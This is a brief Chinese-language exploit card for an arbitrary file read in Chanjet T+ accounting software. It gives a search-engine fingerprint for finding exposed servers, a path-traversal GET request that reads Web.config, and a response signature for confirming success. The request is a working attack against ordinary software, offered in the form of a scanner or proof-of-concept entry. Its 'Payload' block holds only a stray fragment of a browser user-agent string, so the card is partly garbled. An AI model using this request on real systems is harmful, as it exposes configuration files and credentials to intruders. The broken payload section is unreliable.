# 畅捷通T+FormReportOperateAction存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`GET /FormReportOperateAction.aspx?FilePath=../../Web.config HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
```
- **响应特征**：200 config